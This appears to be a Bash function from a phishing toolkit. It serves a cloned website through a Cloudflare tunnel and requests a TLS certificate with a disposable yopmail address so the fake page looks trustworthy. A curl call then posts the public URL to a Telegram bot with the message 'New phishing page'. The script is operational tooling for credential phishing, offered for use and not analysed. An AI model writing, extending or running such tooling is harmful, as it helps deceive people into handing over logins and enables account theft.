
# Start Cloudflared
cloudflared_start() { 
	check_root_and_os
	check_os_and_install_packages
	
	if [[ `command -v termux-chroot` ]]; then
		if [ ! -f ".host/cloudflared" ]; then
			clear; header;
			echo -e "${RED}Error:${WHITE} Cloudflared is not installed."
			exit 1
		fi
		if [ -z "$site" ]; then
			clear; header;
			echo -e "${RED}Error:${WHITE} You have not specified a site name."
			exit 1
		fi
		setup_clone
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
	else
		if [ ! -f ".host/cloudflared" ]; then
			clear; header;
			echo -e "${RED}Error:${WHITE} Cloudflared is not installed."
			exit 1
		fi
		if [ -z "$site" ]; then
			clear; header;
			echo -e "${RED}Error:${WHITE} You have not specified a site name."
			exit 1
		fi
		setup_clone
		if [[ $(uname -a) == *"Microsoft"* ]]; then
			sleep 2 && sudo ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
		else
			sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
		fi
	fi

	{ sleep 12; clear; header; }
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
	echo -e "${WHITE}==================================="
	
	# Install and sign SSL certificate
	if [ ! -z "$cldflr_url" ]; then
		email="$(uuidgen)@yopmail.com"
		echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Obtaining SSL certificate..."${WHITE}
		
		if [[ $(uname -a) == *"Android"* ]]; then
			pkg install -y certbot > /dev/null 2>&1
			certbot certonly --non-interactive --agree-tos --email $email --webroot -w .www -d $(echo $cldflr_url | awk -F/ '{print $3}') > /dev/null 2>&1
		else
			sudo apt-get update > /dev/null 2>&1
			sudo apt-get install -y certbot > /dev/null 2>&1
			sudo certbot certonly --non-interactive --agree-tos --email $email --webroot -w .www -d $(echo $cldflr_url | awk -F/ '{print $3}') > /dev/null 2>&1
		fi
		
		echo -e "${GREEN}[${WHITE}+${GREEN}]${BLUE} SSL certificate has been obtained and installed."${WHITE}

		# Send the URL to a Telegram bot
		bot_token="YOUR_BOT_TOKEN"
		chat_id="YOUR_CHAT_ID"
		if [ ! -z "$bot_token" ] && [ ! -z "$chat_id" ]; then
			echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Sending the URL to a Telegram bot..."${WHITE}
			encoded_url=$(echo $cldflr_url | sed 's/\./%2E/g' | sed 's/\//%2F/g')
			curl -s "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=New%20phishing%20page:%20$encoded_url" > /dev/null
			echo -e "${GREEN}[${WHITE}+${GREEN}]${BLUE} The URL has been sent to the Telegram bot."${WHITE}
		fi
	else 
		echo "${RED}Error:${WHITE} Cloudflared tunnel URL not found."
exit 1
fi


}

